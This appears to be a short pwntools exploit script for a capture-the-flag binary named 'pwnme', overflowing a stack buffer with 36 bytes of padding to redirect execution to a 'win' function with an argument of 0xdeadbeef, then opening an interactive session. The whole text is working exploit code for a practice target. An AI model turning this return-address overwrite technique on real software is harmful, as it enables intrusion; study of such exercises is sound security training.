from pwn import *

elf = context.binary = ELF("./pwnme")
p = process()

win = 0x080491d6
payload = flat(
    cyclic(36),
    win,
    b'junk',
    0xdeadbeef
)

p.sendlineafter(b'\n', payload)
p.interactive()
